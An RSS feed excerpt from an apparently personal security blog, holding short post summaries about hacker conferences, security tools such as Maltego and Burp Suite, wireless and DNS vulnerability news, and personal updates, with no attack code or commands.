Question 1: Now that Clickjacking has faded away from “Newest Greatest BAD STUFF”, how many implemented NoScript personally? What about Enterprise wide?
Question 2: Now, everyone who responded that you are still at IE in the enterprise. Why? Did you show the powers that be clickjacking and it’s effects?
Question 3: Ok here is the final question of the trio, Why, since we rely on IE, aren’t we screeming at M$ to implement NoScript-like features?</description>

      <description>Guest Article By: Ryan Pfleghaar (post_break) of iamthekiller.net
DEFENDING AGAINST JASAGER
Jasager has been making people question wireless security since episode one of season four on Hak5. The number one question besides “How do I get this to work” is &amp;rdquo;How do I protect myself?”. This exploit in wireless security has been somewhat of a challenge to protect against and with this article I am going to detail how Mubix and I came up with a quick and easy fix.</description>

And a piece of it was touched on a piece of the puzzle by Jack Daniel on his blog posting “The Fallacy of Penetration Testing”. We as “Security Professionals” have a big problem. We usually don’t have the power to make change.</description>

More to the point, I have reached a certain level of ‘zen’ with my GTD methods on gmail. I am in a constant battle for “Inbox Zero” and have “Starring” extremely useless for me.</description>

Go with what your readers want right? Well I have recently been getting a lot of hits on finding room sharing at ShmooCon. I have done this before at cons and I have met some very interesting people. So I created the google group ShmooCon RoomShare. Post that you are looking, post that you have space. It’s all voluntary and you can sign up for email alerts so that you don’t have to check it all the time.</description>

      <description>Even if you have been to ShmooCon, something that alludes most con-goers is the Hack or Halo contest. Most of the time you will see it’s organizers at table near the registration desk getting people signed up. What you may not know is how the whole thing goes down. It’s after hours so, you aren’t missing the great content during the day, and it might save you a few dollars of money spending bar time.</description>

      <description>Many of you know who operat0r is, Darren in particular since operat0r pulled a magic trick on Darren’s ACER ONE (Archive.org Links) that turned it from brick to badass in less than 5 minutes. But what some of you may not know is that ol’ McCurdy (operat0r) has some other awesome side projects that run the same course as my style of apps. PORTABLE. But these aren’t the standard portable apps that I find on the net.</description>

      <description>Ok, it&amp;rsquo;s not to you, but it is to a good cause. Here is their blurb:
Hackers for Charity helps non-malicious hackers gain valuable job experience by putting them to work on projects for charity. They also build computer classrooms to help children and adults break the cycle of poverty through empowerment training, and feed children with funds raised by sales of Johnny Long&amp;rsquo;s books.
This month, I thought that it would be fun to partner up with Hackers for Charity in order to raise money for the people of Uganda.</description>

      <description>So I have graduated from the black and green standard hacker theme (with forest header) to a much easier to read and iPhone friendly theme. I have also added a few things to the site. Probably the most noticeable is the new logo. The logo was the created by my good friend TestMAD. He is a starving graphic artist that runs the IRC network ThinStack. He also supports a number of other projects like Geekcred, and Wess Tobler&amp;rsquo;s new project, Unpersons.</description>

      <description>What is CSI? This is what CSI says about it:
 Security is in transition. There is general agreement that security does not work, but not on how to fix it. CSI 2008 is the only event today that faces the challenge to reconsider security. This year at CSI’s annual event, the most innovative minds in security will grapple with the tough questions, providing a reality-check and alternative to cookie-cutter conferences that merely tweak the status quo.</description>

      <description>Hi, and welcome to my trap. I see a ton of searches of just your type on my site on a daily basis. Lets get down to ranting.
Maltego is an awesome tool, it’s also GIVEN AWAY for FREE.. As in beer, which they allow you to use their servers to do your stupid little ego searches on.** STOP TRYING TO STEAL IT.**
Offensive Security 101. This is by far the best course / certification that I have attempted thus far in my career.</description>

      <description>Recently there has been a lot of people in my scope that have been wondering about what &amp;ldquo;hacker&amp;rdquo; or security related podcasts are out there. iTunes does a horrible job at categorizing anything past &amp;ldquo;Technology&amp;rdquo;. That is where Hacker Media.org comes in. Not only can you get the main feed of ALL the hacker/security related podcasts out there, you can get even deeper. Droops, the maintainer of said monster, makes it so you can pick and choose what kind of shows you want to see by having individualized feeds based on categories, and as shows come and go from those categories the feed changes with it.</description>

      <description>EDIT: Switching something from “DRAFT” to “PUBLISH” is a really important step. Sorry guys.
Let me preface all of these tools with, the fact that some don’t come “portable”. To make them so, I have dropped the installer / setup file into Universal Extractor and then cleaned up the directory.
 PortSwigger’s Burp Suite - http://portswigger.net/suite/
 This tool is essential to any web application security guru’s tool belt. If you haven’t used it already it is time to get schooled up on this wreaking ball.</description>

Today I was sitting at home watching Irongeek’s post of John Strand’s talk Defense In Depth is Dead, Long Live Defense In Depth. And I had one really evil thought:
Someone (such as Bob), could sit at an airport. We all do this it isn’t difficult. He could then turn on his laptop and connect it the airport wireless. Another task, difficult for some, but lets go with Bob being able to.</description>

In other words, the &amp;ldquo;AYE&amp;rdquo;s have it. As soon as my Maltego series comes to a close I will be starting the challenges back up again. Thank you for your support and I look forward to the continuation of the challenges, I really had fun with the first one.</description>

      <description>Well, it’s not the only answer but I will call them that because it’s what worked for me:
 Sitting a couple rows down from the line so that no one would see me from the bus line I was targeting, I waited for the bus to come. As soon as it came rolling up and quickly moved into a dash for the door, timing it so that I could cut in line to be the 4th on.</description>

      <description>Here is the scenerio:
There is a line of government, and commerical workers that are in line for the bus. The bus is late, and everyone has had a long day of work. Your target is the first person in line. The line is 75 people long for a bus with a max occupancy of 35 people. Your target is the same sex as you and has headphones in their ears.</description>

I setup ScribeFire with a new blogspot account and now, no more tabs, it truely feels like an application of GTD. Plus it allows anyone who is interested to follow along via the blogspot feed.</description>

What SecShoggoth and I aimed for with this post is to have understandable yet technical and I think he did an awesome job:</description>

 Publish article to blog about problem in product
 Wait for traffic to rise on blog
 Become giddy at rise in traffic due to outstanding title
 Watch as traffic falls within days
 Become angry and write retort (in said blog, still not contacting the company) getting mad about the STILL unfixed problem</description>

Alex Eckelberry over at Sunbelt got an itch to see which virus vendors were just using packer signatures instead of emulating the defaltion process and detecting the virus inside. This is a shortcut that can yield false positives such as demonstarted in Alex’s experiment, but is done due to the overhead such an undertaking would introduce, I assume, to the client software.
I bring this up here because I recently conducted a somewhat similar test, although I admittedly know very little about packers.</description>

 Earlier when going to LinkedIn, I was greeted by a wizard saying that they will performing upgrades tonight. I guess they didn’t go as wel as planned. As a security addict though, I always have that sinking feeling when a server is down. Especially one that has personal information about so many people.

A company called Paraben Corporation went out and made it (Motorola and Samsung support only so far)
I first learned about it via CNet’s report “CSI Stick grabs data from cell phones” and you can find it directly on http://csistick.</description>

There are naysayers: http://www.tgdaily.com/content/view/39154/108/
And then there is the truth: http://www.stillsecureafteralltheseyears.com/ashimmy/2008/09/sucking-the-chr.html
I like the design of the tabs and address bar, but I can do that with a theme in firefox. I want my add-ons, even with the memory problems. Chrome is great for Mom and Pap, but for “Internet Power Users” it falls lightyears short on features. So where is the brass tax?</description>

 DEFCON, the 9000+ attendee hacker conference in Vegas has become a sort of hydra conference. It has become more like a global fair than what most people think of conferences; even the badge is highly unique.</description>

      <description>So, just monitoring twitter for Defcon tweets and came across this one: Matthewneely status update 878833018
Screencap:

So what is cool about this tool? It generates an SQL injection that skirts the 64k size limit using MS Debugger on the victim end.
And of course the DEFCON 16 via Wired Mag (Artcile)</description>

      <description>I recently was Stumbling and happened across the following video. Now, when people use StumbleUpon they are usually bored and aren’t really contributing to the world as we know it. It strikes me as ironic that I found and watched a video like this, via StumbleUpon. I promise, it is well worth the fraction of a wikipedia project cycle you will utilize on it.
My favorite quote out of the whole deal: “Media that is made for you, but does not include you, is not worth sitting still for”</description>

      <description>So, according to my iPhone, the DNS servers that it uses is patched. (209.183.33.23 - schinetdns.mycingular.net) However, when I tried to send an image of the doxpara page through email it gave me an SSL error and asked me to accept the certificate&amp;hellip;. Um, no thank you. So, for the time being I will not be checking my email for a while, or for that matter anything I need to authenticate with.</description>

      <description>It’s almost that time. DefCon is right around the corner and things are coming together nicely. Here is where we stand and a rough schedule of events:
 Bloggers welcome. I got a lot of feedback asking if it’s just for “Podcasters” but we would like to invite bloggers to participate as well.
 I-Hacked.com and Astaro are our current sponsors, and I am still waiting on confirmation from two others.</description>

      <description>So, now that your feed reader is full up of all the DNS problems, I would like to present you with one more tidbit. How many of you have checked your iPhone, Blackberry, or other web enabled mobile device against this vulnerability? I did, and wasn’t happy.

      <description>I am truely getting tired of iPhone &amp;ldquo;Web Apps&amp;rdquo;. I created the title like I was going to give them a fair chance, but they truely have ZERO integration into the actual phone. They do have a pretty interface and I have to give props to some of the design developers, but does this seem more of a copout to anyone else?
I&amp;rsquo;ll give an example. I LOVE Remember the Milk.</description>

      <description>Now, I don’t like to publicly bad mouth companies, but at some point, Comcast’s lack of “service” has got to stop. Well, let me rephrase that: Comcast needs to be held accountable for their utter lack of due diligence. I have been a Comcast customer by default ever since they swallowed the portion of Adelphia that held my area. I say this because only recently, have I actually had a choice in the matter.</description>

      <description>To All,
Well, this year marks the first annual DEFCON Podcaster’s Meetup, and we will be doing it in STYLE. For those of you who made it out to the second annual Podcaster’s Meetup at ShmooCon, we ran into some hitches (like sound), but as we grow, so do the problems. Let me start off by telling you some sweet news. We are nailing down time in a SkyBox! So we will have plenty of room, piece and quite for recording, and a nice view over the con, plus NO WALKING TO THE PARTY.</description>

      <description>On a Dutch news site there was a story about a hacker that stole 50,000 credit cards (well, the information at least) and also stole a prerelease version of Quake Wars. What do you think made the title line? Quake Wars. That puts things in perspective on what is impotant. Big companies like the one that made Quake Wars have the liquid budget to chase this guy down, but the 50,000 individuals don’t.</description>

      <description>So, I made a new category basically for posts that I want to keep for myself and also post for other people not to have as hard a time finding: Archiving.
In Ubuntu I have always set a password for root and “su -” up to root to run things that needed root access. Well after watching IronGeek’s latest video on Labrea (click here to watch the video). I gleaned a new way to get to a root prompt without having to set a password and su up each time.</description>

      <description>Now that everyone and their mother has posted about Back|Track Final being released I feel that I am safe in disclosing that information. But on to the topic, with said release, the folks over at Paterva have released a “Community” edition of Maltego. Straight from the horses mouth, here are the limitations:

      <description>So I had another one of my harebrained ideas and it goes something like this:
Do you use your “DMZ” feature on your router at home? If you do, you shouldn’t. It’s like putting your computer directly on the net. Bad idea all around. Well, instead of having all those packets hit a brick wall, why not put them to good use?
So, create a Virtual Machine that you have running on your system and point your DMZ switch at.</description>

      <description>So I was at a ‘talk’ recently where the topic was geared toward technically inclined, but the whole talk was geared toward managers and low level IT bubbas, if you will. But as I sat there stabbing myself in the eye with my pencil (hence the mad cow reference) I can up with some hair brained ideas. Now, some of these ideas might already be out there or thought of, and I haven’t googled any of them, just wanted to write them down somewhere for people to comment on.</description>

      <description>So, I have to apologize to the whole Security community for my idiocy. Yesterday I was made aware of a post about Backtrack 3 Final coming out. The link I received was a link to Mut’s blog. While reading the post it mentioned something about an early IRC release. Proceeding to IRC I found a direct link to the ISO in the topic. Excited about the release I failed to read the rest of the topic in IRC mentioning that they wanted it to stay within the IRC community.</description>

      <description>So, this is the second time I am writing this article, which really takes writers block to a whole new level. It sucks to loose all of your writing a one fatal click. But enough of my belly aching.

Phrack Issue #65 is out, as of April 11th, 2008. I am by no means a Phrack addict or aficionado on all things Phrack, and I have only read TCLH’s introduction which in my humble opinion it is close to Mentor worthy.</description>

      <description>Red Skelton was a good &amp;amp; funny man. He also ended every show by saying, ‘GOOD NIGHT AND GOD BLESS.’ Listen to the end of this. It is something he said 39 years ago.

      <description>So, a while back I wrote about a program called “Evolution”. Since then it has evolved into its new form “Maltego”. Maltego has had it’s face ripped off and remolded, and lot of work on the back end, if you know what I mean.
So basically I was teased by the creator of Maltego. He sent me these two images showing the awesomeness that will be Maltego v2 (and yes, Awesomeness is a word)</description>

Something like those old keyloggers that you plug between a PS/2 keyboard and a computer. If it already exsists, please link me, but this is what I want it to do:
Features of the KVM-MITM:
 Ports: (2) DVI or VGA; (2) Ethernet NICs; (4) USB or/and (4) PS/2 Ports &amp;lt;&amp;ndash; Half male, Half female</description>

 Hak.5 Radio - This project has taken on a life of it’s own, the community member run it and are currently working on a site design and back end. I really have to applaud the effort and free time that everyone on the H5rDev team has put into making the only community radio station on the net so sucessful.</description>

      <description>So, last Shmoocon (2007) was my second year running at the con and we did something that hasn&#39;t been done before: A Security/Hacker&#39;s Pod/Vidcast meetup at the conference which gave a chance for their listeners/viewers to meet the people behind the mic/camera. Well, a little less than one year later and plans for the next meetup are already underway. And, as I learn the ropes of putting something like this together we will be getting better venues and hopefully down the road meetups will pop up at Defcon and other conferences.</description>

      <description>So, this is my first time writing with ScribeFire. (We&amp;rsquo;ll see if it auto detects it&amp;rsquo;s name and links to it. But, as you can probably tell by the title, this article isn&amp;rsquo;t about ScribeFire. It&amp;rsquo;s about Logmein.com. Now, you most likely have already seen or used this service, and I have fought back in forth in my head about regurgitating information which I think people already know.

Or, you might be a Penetration Tester who is in the “Enumeration / Information Gathering” phase. Or a Security Professional that wants to keep tabs on what kind of fingerprint their company has out there.</description>

A design flaw found in ActionScript (Flash) has been allowed the scanning hosts via trial and error. Whenever a port is queried by Flash that isn’t open, it responds with a “SecurityErrotEvent” instantly. But, when a port is open, it doesn’t get that response for an extended period of time, while it waits for a reply to “policy-file-request”. PoC can be viewed at the below address. Now the question is: What ELSE can you do with this information once you have this ability.</description>

Secunia.com has been a great resource of vulnerability and virus information over the years for Black, Grey, and White hat hackers alike. Recently they released a BETA project that looks promising and could be the first step into a &amp;ldquo;package manager&amp;rdquo; for Windows. In there own words:
 A new addition to the Secunia Software Inspector series, the free Secunia Personal Software Inspector (PSI), is now available for BETA testing.</description>

      <description>A couple people have asked for links on where I got this portable app or that, well, all over really. Here are a few links to get you started:
http://www.dirk-loss.de/win-tools.htm
http://www.tinyapps.org/
http://www.portablefreeware.com/
http://en.wikipedia.org/wiki/List_of_portable_applications
http://standalone.atspace.org/
http://portableapps.com/apps
http://www.kikizas.net/en/usbapps.html
Also, I gave some of the apps their portability myself. It&amp;rsquo;s a easy process. Drag and drop an installer file &amp;ldquo;setup.exe&amp;rdquo; or &amp;ldquo;whatever.msi&amp;rdquo; into Universal Extractor. What you are going to get is a folder right where that installer is, with the same name as the installer.</description>

      <description>I don&amp;rsquo;t use Wine. It&amp;rsquo;s difficult to get anything working and a pain once it is. However since I found out about the Wine-Doors project, it&amp;rsquo;s made me go back on that thought.
It&amp;rsquo;s a fairly new project, but well on it&amp;rsquo;s way to being an enabler for a great many users. A great many users have been looking for that one last thing, to get them over the hump of still using Windows.</description>

Wubi &amp;ldquo;Linux&amp;rdquo; Installer: http://wubi-installer.org/
This is actually pretty amazing. What it does is automagically downloads an ISO (takes a while), makes a virtual disk, puts entries in the Windows boot loader and tells you to restart. When you restart it boots to the virutal disk and installs the version of Ubuntu you chose.</description>

I know it&amp;rsquo;s been out there since the dawn of time but I simply thought it was a way of broadcasting video across the network. WRONG. So for those who don&amp;rsquo;t know, and correct me if I am wrong, a computer or device sends out a multicast packet headed for a 244.</description>

I guess this raises a good question. What regulates the rise and fall of prices on the internet? Do you “shop around” for books on the internet? Or do you just go to Amazon.com and buy what you need?</description>

      <description>Recently I was listening to Episode 66 of PaulDotCom Security Weekly and they briefly touched on Packetfence. Packet Fence is a Open Source NAC. This is the first time that I have really gotten hand on a NAC. I have heard of NAC and at ShmooCon Labs, I was part of Simple Nomad&amp;rsquo;s team and Vernier&amp;rsquo;s IPS/NAC. However, I didn&amp;rsquo;t get a chance to get hands on during the con. So that puts me in the &amp;ldquo;noob&amp;rdquo; category.</description>

      <description>So you couldn&amp;rsquo;t make it. No worry, you have undoubtedly been going through the videos from shmoocon already. If you haven&amp;rsquo;t yet, you should, they were well done and better than last year. But, what you might not have done yet is the Hack or Halo contests.
 Update: We&amp;rsquo;ve determined the images have become corrupt during one of the transfers and have been taken offline until the problem has been fixed.</description>

      <description>The contest that won two &amp;ldquo;hackers&amp;rdquo; PS3s at ShmooCon is now open to the public. I found this post on http://hkashfi.blogspot.com/index.html
 ShmooCon07 &amp;ldquo;Hack it&amp;rdquo; Contest During Shmoocon2007 there was a contest open to interested hackers. If you&amp;rsquo;re curious about it but hadn`t chance to join the con, well it&amp;rsquo;s still open for you to check your skills but don&amp;rsquo;t expect any reward :&amp;gt; If you like to get familiar with challenges in Cons, you can try this one.</description>

      <description>So, it&amp;rsquo;s over. ShmooCon and the meet up is finally over. I had a blast, but it put a tax on my time like you wouldn&amp;rsquo;t believe. I can&amp;rsquo;t imagine what life is like for the Shmoo group, especially Heidi. I will be posting all of the pictures on flickr shortly. I got to do a lot of other things at ShmooCon other than just the meet up. I had the distinct opportunity to help bag over 1000 bags with swag, Shmooballs, and adverts.</description>

Ok, so there I was&amp;hellip;
I saw on Betanews.com a article on Vista Hardware Assessment Tool Addresses Upgrade Dilemmas by Scott M. Fulton, III of Betanews, which toted of a Windows XP tool to check for hardware compatibility for Vista.

      <description>First of all, every blog entry on every blog, is in fact a RANT. So, stating that one is, is kind of pointless. That being said. Here is my rant:
Now that I have changed this part of my blogisphere, I have been getting guff about not covering certain exploits and 0-days. So here it is:

      <description>Alright, before you start sending hate mail or posting comments on how you hate my mother for giving birth to me, bare with me.
So, Microsoft puts out their new operating system that is &amp;ldquo;A New Day&amp;rdquo;. Microsoft at the launch states that they are already &amp;ldquo;full speed ahead on SP1&amp;rdquo;. Microsoft releases that they will be releasing Vienna&amp;rsquo;s successor in 2009.
Those are the facts. Or, as I like to call them &amp;ldquo;Time-insensitive&amp;rdquo; facts.</description>

      <description>I&amp;rsquo;m going to start this whole security thing by taking a look at the new BitLocker technology built in to Vista. Before I begin, I want to specify that I am by no means an expert on BitLocker and all of my information comes from the Microsoft site and a face to face with the engineers at Launch Tour 2007. So lets begin with requirements. You must have a modern motherboard which has a &amp;ldquo;TPM&amp;rdquo; or Trusted Platform Module.</description>

      <description>Well, since they mentioned room362.com on Hak.5 live, I guess I have to update this more often. At first I was updating my Vox and this with the same stuff, and then it became just Vox. So I have decided to separate the way I use each. From now on this will be a security blog. More to come.

      <description>Boss! I can&#39;t come in today. I woke up this morning and found 20 inches of snow in front of my drive way. Don&#39;t we all wish it was this simple. Anyways, I went home for Christmas, back to Oregon. Had a good time, got some good presents, yup... everything was good. New Years is coming up. 2007... yeah, the whole millennium thing is wearing off. As for the key chain, I got a cool skeleton key chain for Christmas that is almost impossible to fit in my pocket, but oh so worth it.</description>

      <description>Sorry to get your hopes up, but other people have been waiting for this to happen too&amp;hellip;. Well, a design team was actually formed and got together to build a &amp;ldquo;mod&amp;rdquo; for StarCraft based on the WarCraft 3 engine. Some are calling this StarCraft 2, however Blizzard has refrained from fomally answering any questions about the unofficial mod.

      <description>I have decided this year, for my birthday, to create a list of so-called “WANTS”. I prefer to see them as “NEEDS”. I have intentionally created this list large, as to give the most choices when selecting a gift. I have also tried to provide links to where these items can be bought online for the least amount of money. I have intentionally left prices out of this, and the list is unordered.</description>

First things first: No, the person next to me wasn&amp;rsquo;t an old lady that wanted to talk my ear off or a crying baby. It was actually a mother of an adorable boy that was sitting near the window. But you don&amp;rsquo;t want to hear about good stuff.</description>

Well, once my integrated card reader decides to read xD M-class cards. I just applied the patch from HP but it still has major problems. It gets to the first image and stops reading and I get all kinds of write errors. To add salt to the wound, I forgot my USB cable to my camera, so I really have no way of getting my pictures off the camera.</description>

I have taken action to ensure that this privledge that I am extending to the world, free of charge, is not abused. I have a cron job running that assess that use of that specific file and by what IPs. It then takes any IP with use over a certain limit and adds them to a complete block, to the relay, to my site, and any other site that I host.</description>

      <description>I want to take this opportunity to pay some homage to a great man that I had the pleasure of watching on TV at great lengths, thanks to my dad. Don Knotts, also know as Baney Fife from the Andy Griffith show. Rest In Peace:
I found out from the Washington Post at this article:

      <description>Today I saw on Bugtraq a new 0 day coming that affects all up to date versions of windows. The most extraordinary part of this, and similar disclosures, is their workarounds. Since Redmond has decided not to patch, until a later date, it is up to the discloser or a likeminded individual to figure out how to protect the masses. Guess what ends up being the fix? “Disable said Microsoft FEATURE”.</description>

I met some great people to include but not limited to, Lance James, Kevin Mitnick, Fyodor - A.K.A the creator of NMAP, Skydog, DC-Mike, and Simple Nomad.</description>

This year is going to be a very different one for me since my wife and I are expecting in Feb. I am really excited about my future son. It is a blessing to be able to bring a life into the world, and a big responsibility. I am also starting college back up.</description>

      <description>December 2nd, I drove down to Williamsburg VA to meet up with the guys from Hak.5 and Frank Linhares. For those of you who don&amp;rsquo;t know. Hak.5 is an IPTV (Vidcast) show, which basically boils down to a TV show on the internet. Anyways, I got to meet up with these fellas and a couple other interesting people. While I was there, I had the privilege of helping out not only in the live techPhile podcast by Frank Linhares, but also the &amp;lsquo;glue&amp;rsquo; segments of Ep 5 of Hak.</description>

      <description>Well if you were wondering about me, I didn&amp;rsquo;t die. I am working on a super secret project for Frank Linhares of techPhile.ca
But don&amp;rsquo;t tell anyone! That is secret squrrell news. I have also submitted some logo ideas for the new Auditor Security Collection. You can vote for me: HERE
I also got a HP dv1420us which, so far, I really like. It doesn&amp;rsquo;t like linux too much, but it is challenging me to learn more about the kernel and other aspects of linux to fix the problems.</description>

      <description>Most of us in the industry know what the slashdot effect is. But for those who don’t. Slashdot.org has such a following, that, when a news article is posted on Slashdot, so many users click on the links provided that a unintentional DDoS or Distributed Denial of Service attack is created, where the news site is taken basically killed by all the traffic that it instantly has to deal with.

That is discrimination and WE DON’T HAVE TO TAKE IT!. Back to reality. Well if you don’t know ShmooCon is basically the DefCon for the east coast and is being held in Washington D.C. . Registration is limited, unlike DefCon, so hurry and whip out those Paypal accounts.</description>

Quick history of WHAX:
 Whoppix based off Knoppix: Awesome CD
 Whoppix gets a name change and base distro change: Not broken, don&amp;rsquo;t fix it.
 New WHAX website gets hacked: ironic.
  Sep 9th&amp;hellip; We (WHAX) are merging with Auditor, we need a new name: Anyone up for a downhill run?

The windows version of America’s Army version 2.4 came out May 16th 2005. That is a 127 days (4 months) at the time of this post. Where are the Linux and Mac versions?!?! We are still stuck in version 2.3. They haven’t even release an update so we can at the very least run linux servers!</description>

      <description>LADIES AND GENTLEMEN,
I am proud to announce that TechTV, the cable television channel that we know and USED to love might just be making a comeback. In an ‘Aliens’ sort of revival, a year and a half after they were pwnd ‘merged’, might be popping out on top of G4. For starters they are bringing back “Call for Help” with Leo Leporte. First seen on KevinRose.com which is a blog written by, yup you guessed it Kevin Rose, the next move is that the G4 Founder and CEO who engineered the dumbass move ‘merger’ has been FIRED!</description>

      <description>I have officially determinded 12 hour shifts suck. Whoever invented this crazy idea needs to be shot. Oh! I’ve got an idea! Instead of 3 people per day, which allowed all three to have proper recoupe time, lets make it just 2 on a 12 on, 12 off schedule! We can use that employee somewhere else! Sound like an issue of Dilbert? Yeah, I thought so too.

      <description>I went to see The Transporter 2 tonight. Normally I watch movies using an ‘alternative’ method, but for action movies it is really hard to get into it without the 13 speakers blaring heart pumping music into your face for a eyeball warping experience. I have to admit, that this movie was great, but if it had not been for the fantastic sound effects, music, and overall audible feel to the movie, I would have thought less of it.</description>

      <description>Yes that is right, you heard it here first! BADFOO.NET is up! I’m not saying that they (he) has content up yet, except for a pic of a hacked up HP. But I have assigned a couple reporters to this story and I will keep updates as this page evolves.</description>

      <description>Let me be the first to welcome Gentoo into the 21st Century. Creating an Installer instead of a 40 page &amp;lsquo;Handbook&amp;rsquo; was a bold and innovative move. In this bold move they have enticed new blood to this awesome distro such as the renowned Silent_Bob who now goes under the alias thesb to avoid FBI and CIA warrants, but that is another story altogether. (Which I will follow-up on if you, the reader, comment and tell me to) But back to Gentoo.</description>

      <description>Age of Empires II - Age of Kings. That is a great game. It has something that not a lot of games have these days, which is replay value. Once you beat a game, that is it. No more fun. You know all the secrets.
That is where MMORPG came into the picture. But still most of them are still lacking. You can get to Level 60 or Level 70 and you have reached the top.</description>

      <title>Intro to Programming (Java)</title>

      <description>Right now I am taking a class called “Intro to Programming”. And yup! you guessed it! The first assignment is to make a Hello World program. For those who don’t know, that is the Globally accepted first assignment for programming languages, be it HTML, Java, C++, PHP, python, or Assembly. Now this is where I get to voice my opinion of Java so far: It bites! Any language that makes you write 3 lines of code just to print “Hello World” is stupid.</description>

      <description>Well, I finally got a working CMS type deal going on for a blog. I was going to write one but decided not to. Call it lazy or standing on the shoulders of programming gods, you choose.</description>
